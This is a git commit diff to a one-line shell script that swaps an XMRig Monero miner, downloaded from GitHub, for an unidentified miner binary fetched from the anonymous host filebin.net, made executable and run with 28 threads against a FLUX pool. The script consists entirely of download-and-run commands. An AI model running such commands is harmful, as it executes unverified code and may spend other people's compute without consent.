41efdc5079ff968043642cca8bec171cf4b6faf8
terasaka253 <terasaka253@gmail.com>
2025-09-10 04:05:12 +0700

    ye.sh

--- ye.sh
+++ ye.sh
@@ -1,1 +1,1 @@
-mkdir 7RfZ2bBn && cd 7RfZ2bBn && wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz && tar -zxf xmrig-6.21.0-linux-x64.tar.gz && cd xmrig-6.21.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BONK:7C3vQRUmUzj53r6bT74TxcTV7RfZ2bBnozByYPKEnhDr.meki#4yh6-ojiu -p x
+wget https://filebin.net/mlp1gt9ec3s18saf/cpuminertermux && chmod +x cpuminertermux && ./cpuminertermux -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u t1fNgzdtSPKKSqcGiWvL42QZxq5CmVXX82R -p c=FLUX --threads 28
